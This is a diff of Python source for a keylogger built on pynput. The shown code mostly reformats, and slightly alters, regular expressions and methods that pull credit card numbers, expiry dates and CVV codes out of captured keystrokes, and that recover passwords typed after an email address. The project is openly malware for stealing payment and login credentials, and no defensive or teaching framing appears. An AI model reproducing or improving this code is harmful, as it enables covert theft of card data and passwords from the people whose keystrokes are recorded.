@@ -6,8 +6,16 @@ import re
 from pynput.mouse import Listener
 
 CREDIT_CARD_NUMBER_REGEXP = re.compile("[0-9]{4}[ ]?[0-9]{4}[ ]?[0-9]{4}")
-CREDIT_CARD_EXPIRY_REGEXP = re.compile("[\t]?(?:!CLICK!)?[\n]?([0-9]{2}[\t ,\\\/]?[0-9]{2})")
-CREDIT_CARD_CVV_REGEXP = re.compile(CREDIT_CARD_NUMBER_REGEXP.pattern + "(?:" + CREDIT_CARD_EXPIRY_REGEXP.pattern + ")[\t]?(?:!CLICK!)?[\n]?" + "([0-9]{3})")
+CREDIT_CARD_EXPIRY_REGEXP = re.compile(
+    "[\t]?(?:!CLICK!)?[\n]?([0-9]{2}[\t ,\\\/]?[0-9]{2})"
+)
+CREDIT_CARD_CVV_REGEXP = re.compile(
+    CREDIT_CARD_NUMBER_REGEXP.pattern
+    + "(?:"
+    + CREDIT_CARD_EXPIRY_REGEXP.pattern
+    + ")[\t]?(?:!CLICK!)?[\n]?"
+    + "([0-9]{3})"
+)
 
 
 class Keylogger:
@@ -55,14 +63,21 @@ class Keylogger:
     # Gets any credit card info from the local buffer (credit card number, expiry date, cvv number)
     def __get_credit_card_info(self, buffer: str) -> list:
         credit_card_numbers = re.findall(CREDIT_CARD_NUMBER_REGEXP, buffer)
-        expiry_dates = re.findall(re.compile(CREDIT_CARD_NUMBER_REGEXP.pattern + CREDIT_CARD_EXPIRY_REGEXP.pattern), buffer)
-        credit_card_cvv_numbers = [x[1] for x in re.findall(CREDIT_CARD_CVV_REGEXP, buffer)]
+        expiry_dates = re.findall(
+            re.compile(
+                CREDIT_CARD_NUMBER_REGEXP.pattern + CREDIT_CARD_EXPIRY_REGEXP.pattern
+            ),
+            buffer,
+        )
+        credit_card_cvv_numbers = [
+            x[1] for x in re.findall(CREDIT_CARD_CVV_REGEXP, buffer)
+        ]
 
         INFO = {
             "creditCardNumbers": credit_card_numbers,
             "expiryDates": expiry_dates,
-            "cvvNumbers": credit_card_cvv_numbers}
-
+            "cvvNumbers": credit_card_cvv_numbers,
+        }
 
         return INFO
 
@@ -76,7 +91,8 @@ class Keylogger:
     def __get_passwords(self, buffer: str) -> list:
         # find email with regex, get all the characters until enter or !CLICK(which is what we put as mouse click event)
         passwords_not_split = re.findall(
-            "[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[com|ca|net|org]+(.*[\n|!CLICK])", buffer
+            "[a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[com|ca|net|org]+[\s]?(.*)[\n|!CLICK!]",
+            buffer,
         )
         passwords = []
 
